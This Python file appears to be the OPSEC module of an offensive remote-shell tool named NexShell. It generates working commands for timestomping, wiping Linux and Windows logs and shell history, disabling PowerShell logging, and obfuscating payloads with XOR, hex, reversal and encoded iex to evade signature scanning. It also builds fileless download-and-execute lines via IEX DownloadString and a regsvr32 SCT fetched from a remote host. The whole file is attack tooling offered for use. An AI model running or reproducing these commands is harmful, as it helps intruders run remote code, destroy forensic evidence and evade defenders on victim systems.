#!/usr/bin/env python3
"""
NexShell — OPSEC Module
Ghost/Normal/Paranoid profiles, timestomping, log cleaning,
advanced obfuscation engine (XOR, split, IEX), session keepalive.
"""

import os
import re
import base64
import random
import string
import hashlib
import datetime
import time
import threading
from typing import Optional


# ══════════════════════════════════════════════════════════════════════════════
#  OPSEC PROFILES
# ══════════════════════════════════════════════════════════════════════════════

OPSEC_PROFILES = {
    'ghost': {
        'label':          'Ghost Mode — Maximum Stealth',
        'jitter_ms':      (800, 3000),     # random delay between commands
        'no_disk_writes': True,            # all modules run in-memory only
        'clear_history':  True,            # unset HISTFILE before any cmd
        'timestomp':      True,            # modify file timestamps
        'log_cleaning':   True,            # attempt wtmp/utmp/syslog cleanup
        'slow_output':    True,            # drip output to avoid timing analysis
        'no_colorize':    False,
        'keep_alive_s':   60,              # heartbeat interval
    },
    'normal': {
        'label':          'Normal Mode — Balanced',
        'jitter_ms':      (0, 200),
        'no_disk_writes': False,
        'clear_history':  False,
        'timestomp':      False,
        'log_cleaning':   False,
        'slow_output':    False,
        'no_colorize':    False,
        'keep_alive_s':   30,
    },
    'paranoid': {
        'label':          'Paranoid Mode — APT-grade',
        'jitter_ms':      (2000, 8000),
        'no_disk_writes': True,
        'clear_history':  True,
        'timestomp':      True,
        'log_cleaning':   True,
        'slow_output':    True,
        'no_colorize':    True,
        'keep_alive_s':   120,
    },
}

# Active profile — default normal
_active_profile: dict = OPSEC_PROFILES['normal']


def set_profile(name: str):
    global _active_profile
    if name not in OPSEC_PROFILES:
        raise ValueError(f"Unknown profile: {name}. Choose: {list(OPSEC_PROFILES)}")
    _active_profile = OPSEC_PROFILES[name]
    return _active_profile


def get_profile() -> dict:
    return _active_profile


def jitter_sleep():
    """Apply randomized sleep based on active OPSEC profile."""
    lo, hi = _active_profile.get('jitter_ms', (0, 0))
    if hi > 0:
        ms = random.randint(lo, hi)
        time.sleep(ms / 1000.0)


# ══════════════════════════════════════════════════════════════════════════════
#  TIMESTOMPING  — modify file timestamps to blend in
# ══════════════════════════════════════════════════════════════════════════════

class Timestomp:
    """Modify file timestamps to match reference files."""

    @staticmethod
    def linux_match_reference(target: str, reference: str = '/bin/ls') -> str:
        """Bash one-liner to copy timestamps from reference to target."""
        return f"touch -r {reference} {target}"

    @staticmethod
    def linux_set_date(target: str, date: str = '202301010000') -> str:
        """Set specific timestamp. Format: YYYYMMDDhhmm"""
        return f"touch -t {date} {target}"

    @staticmethod
    def linux_batch_stomp(directory: str, reference: str = '/usr/bin/python3') -> str:
        return (
            f"find {directory} -type f -exec touch -r {reference} {{}} \\; 2>/dev/null"
        )

    @staticmethod
    def windows_stomp(target: str, ref_year: int = 2022) -> str:
        """PowerShell timestomp — set creation/write/access to old date."""
        ts = f"{ref_year}-01-01 00:00:00"
        return (
            f"$f = Get-Item '{target}';"
            f"$d = [datetime]'{ts}';"
            "$f.CreationTime = $d;"
            "$f.LastWriteTime = $d;"
            "$f.LastAccessTime = $d"
        )

    @staticmethod
    def windows_match_windir(target: str) -> str:
        """Match timestamp to system32 (blends with OS files)."""
        return (
            f"$f = Get-Item '{target}';"
            "$ref = Get-Item 'C:\\Windows\\System32\\ntoskrnl.exe';"
            "$f.CreationTime  = $ref.CreationTime;"
            "$f.LastWriteTime = $ref.LastWriteTime;"
            "$f.LastAccessTime = $ref.LastAccessTime"
        )


# ══════════════════════════════════════════════════════════════════════════════
#  LOG CLEANING
# ══════════════════════════════════════════════════════════════════════════════

class LogCleaner:
    """Remove evidence from system logs — Linux and Windows."""

    @staticmethod
    def linux_clean_all(attacker_ip: str = '') -> str:
        """Clean common log artifacts — run in-memory."""
        ip_filter = f"grep -v '{attacker_ip}'" if attacker_ip else 'cat'
        return f"""
# Clear shell history immediately
unset HISTFILE; history -c; export HISTSIZE=0

# Wipe bash history file
for f in ~/.bash_history ~/.zsh_history ~/.python_history ~/.local/share/fish/fish_history; do
    [ -f "$f" ] && > "$f"
done

# Clean auth logs (requires root)
if [ "$(id -u)" -eq 0 ]; then
    {ip_filter} /var/log/auth.log | truncate -s 0 /var/log/auth.log 2>/dev/null
    > /var/log/wtmp 2>/dev/null
    > /var/log/btmp 2>/dev/null
    > /var/log/lastlog 2>/dev/null
    {ip_filter} /var/log/secure 2>/dev/null > /tmp/.t && mv /tmp/.t /var/log/secure 2>/dev/null
    {ip_filter} /var/log/syslog 2>/dev/null > /tmp/.t && mv /tmp/.t /var/log/syslog 2>/dev/null
fi

# Clear utmp (who/w command data)
> /var/run/utmp 2>/dev/null

# Remove temp files from this session
rm -f /tmp/nxsh_* /tmp/.nxsh* 2>/dev/null
"""

    @staticmethod
    def linux_remove_from_logs(attacker_ip: str, log_file: str = '/var/log/auth.log') -> str:
        return (
            f"grep -v '{attacker_ip}' {log_file} > /tmp/.cl && "
            f"mv /tmp/.cl {log_file}"
        )

    @staticmethod
    def windows_clear_logs() -> str:
        return (
            "wevtutil cl System 2>$null;"
            "wevtutil cl Security 2>$null;"
            "wevtutil cl Application 2>$null;"
            "wevtutil cl 'Windows PowerShell' 2>$null;"
            "wevtutil cl 'Microsoft-Windows-PowerShell/Operational' 2>$null;"
            "Clear-History 2>$null;"
            "Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue"
        )

    @staticmethod
    def windows_clear_prefetch() -> str:
        """Delete prefetch files (if admin)."""
        return "Remove-Item C:\\Windows\\Prefetch\\* -Force -ErrorAction SilentlyContinue"

    @staticmethod
    def windows_disable_logging() -> str:
        """Disable script block logging (requires admin)."""
        return (
            "Set-ItemProperty 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' "
            "-Name 'EnableScriptBlockLogging' -Value 0 -ErrorAction SilentlyContinue;"
            "Set-ItemProperty 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription' "
            "-Name 'EnableTranscripting' -Value 0 -ErrorAction SilentlyContinue"
        )


# ══════════════════════════════════════════════════════════════════════════════
#  OBFUSCATION ENGINE  — Extended
# ══════════════════════════════════════════════════════════════════════════════

class ObfuscationEngine:
    """Multi-technique payload obfuscation — no external dependencies."""

    # ── Basic ─────────────────────────────────────────────────────────────────
    @staticmethod
    def base64_encode(payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def base64_ps(payload: str) -> str:
        """UTF-16LE base64 for PowerShell -enc."""
        return base64.b64encode(payload.encode('utf-16-le')).decode()

    @staticmethod
    def hex_encode(payload: str) -> str:
        return payload.encode().hex()

    @staticmethod
    def hex_bash(payload: str) -> str:
        hex_str = payload.encode().hex()
        return f"echo {hex_str}|xxd -r -p|bash"

    # ── XOR ───────────────────────────────────────────────────────────────────
    @staticmethod
    def xor_encode(payload: str, key: int = None) -> dict:
        """XOR encode payload — returns key and base64-encoded result."""
        if key is None:
            key = random.randint(1, 254)
        encoded = bytes(ord(c) ^ key for c in payload)
        b64     = base64.b64encode(encoded).decode()
        decode  = (
            f"python3 -c \""
            f"import base64;"
            f"d=base64.b64decode('{b64}');"
            f"print(''.join(chr(b^{key}) for b in d))\" | bash"
        )
        return {'key': key, 'b64': b64, 'decoder': decode}

    @staticmethod
    def xor_encode_ps(payload: str, key: int = None) -> dict:
        """XOR encode for PowerShell."""
        if key is None:
            key = random.randint(1, 254)
        encoded = bytes(ord(c) ^ key for c in payload)
        b64     = base64.b64encode(encoded).decode()
        decode  = (
            f"$k={key};"
            f"$d=[Convert]::FromBase64String('{b64}');"
            "$o=''; foreach($b in $d){$o+=[char]($b -bxor $k)};"
            "iex $o"
        )
        ps_enc = base64.b64encode(decode.encode('utf-16-le')).decode()
        return {'key': key, 'b64': b64, 'ps_cmd': f'powershell -enc {ps_enc}'}

    # ── String manipulation ───────────────────────────────────────────────────
    @staticmethod
    def string_concat_bash(cmd: str, chunk_size: int = 4) -> str:
        """Split bash command into concatenated string parts."""
        parts = [f'"{cmd[i:i+chunk_size]}"' for i in range(0, len(cmd), chunk_size)]
        concat = '+'.join(parts)
        return f'eval $({concat})'

    @staticmethod
    def string_concat_ps(cmd: str, chunk_size: int = 5) -> str:
        """Split PowerShell command into concatenated string parts."""
        parts = [f'"{cmd[i:i+chunk_size]}"' for i in range(0, len(cmd), chunk_size)]
        concat = '+'.join(parts)
        return f'iex ({concat})'

    @staticmethod
    def reverse_string_bash(cmd: str) -> str:
        """Encode as reversed string — bypass simple signature matching."""
        rev = cmd[::-1]
        return f"echo '{rev}'|rev|bash"

    @staticmethod
    def char_array_ps(cmd: str) -> str:
        """PowerShell char array obfuscation."""
        char_arr = ','.join(str(ord(c)) for c in cmd)
        return f"iex([string]::join('',([char[]]({char_arr}))))"

    # ── IEX / Fileless ────────────────────────────────────────────────────────
    @staticmethod
    def iex_download(url: str) -> str:
        """Fileless execution via IEX (PowerShell)."""
        cmd = f"IEX(New-Object Net.WebClient).DownloadString('{url}')"
        enc = base64.b64encode(cmd.encode('utf-16-le')).decode()
        return f"powershell -nop -ep bypass -enc {enc}"

    @staticmethod
    def iex_from_env(payload: str) -> str:
        """Store payload in env var, execute from there — evades string scanning."""
        b64 = base64.b64encode(payload.encode('utf-16-le')).decode()
        return (
            f"$env:_p='{b64}';"
            "powershell -enc $env:_p"
        )

    @staticmethod
    def sct_url(host: str, port: int) -> str:
        """Regsvr32 SCT file URL — LOLBin fileless execution."""
        return (
            f'regsvr32 /s /n /u /i:http://{host}:{port}/payload.sct scrobj.dll'
        )

    # ── Random variable obfuscation (PowerShell) ──────────────────────────────
    @staticmethod
    def random_var_ps(payload: str) -> str:
        """Wrap PowerShell payload with randomized variable names."""
        def rvar(n=6):
            return ''.join(random.choices(string.ascii_letters, k=n))
        v1, v2 = rvar(), rvar()
        enc = base64.b64encode(payload.encode('utf-16-le')).decode()
        return (
            f"${v1}='{enc}';"
            f"${v2}=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(${v1}));"
            f"iex ${v2}"
        )

    # ── All variants for a given payload ─────────────────────────────────────
    @classmethod
    def all_variants(cls, payload: str, target: str = 'linux') -> list:
        variants = []
        if target == 'linux':
            variants = [
                ('base64',         f"echo {cls.base64_encode(payload)}|base64 -d|bash"),
                ('hex',            cls.hex_bash(payload)),
                ('xor',            cls.xor_encode(payload)['decoder']),
                ('reverse',        cls.reverse_string_bash(payload)),
            ]
        elif target == 'windows':
            variants = [
                ('base64 -enc',    f"powershell -enc {cls.base64_ps(payload)}"),
                ('xor (PS)',       cls.xor_encode_ps(payload)['ps_cmd']),
                ('char array',     cls.char_array_ps(payload)),
                ('random var',     cls.random_var_ps(payload)),
                ('env var',        cls.iex_from_env(payload)),
            ]
        return [{'technique': name, 'obfuscated': code} for name, code in variants]


# ══════════════════════════════════════════════════════════════════════════════
#  SESSION KEEPALIVE
# ══════════════════════════════════════════════════════════════════════════════

class SessionKeepalive:
    """
    Send periodic no-op commands to keep the shell alive.
    Prevents idle timeout on firewalls and SSH keepalive triggers.
    """

    def __init__(self, send_fn, interval_s: int = 30):
        self._send   = send_fn
        self._interval = interval_s
        self._stop   = threading.Event()
        self._thread = threading.Thread(target=self._loop, daemon=True)

    def start(self):
        self._thread.start()
        return self

    def stop(self):
        self._stop.set()

    def _loop(self):
        while not self._stop.wait(self._interval):
            try:
                # Invisible: write space + backspace (no terminal echo)
                self._send(b' \x08')
            except Exception:
                break


# ══════════════════════════════════════════════════════════════════════════════
#  OPSEC HELPER — environment preparation on target
# ══════════════════════════════════════════════════════════════════════════════

GHOST_PREAMBLE_LINUX = """
# NexShell Ghost preamble — run before anything else
unset HISTFILE; unset HISTFILESIZE; export HISTSIZE=0
export HISTIGNORE='*'
# Disable core dumps
ulimit -c 0 2>/dev/null
"""

GHOST_PREAMBLE_WINDOWS = (
    "Set-PSReadlineOption -HistorySaveStyle SaveNothing 2>$null;"
    "[System.Environment]::SetEnvironmentVariable('HISTFILE','') 2>$null;"
    "Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue"
)
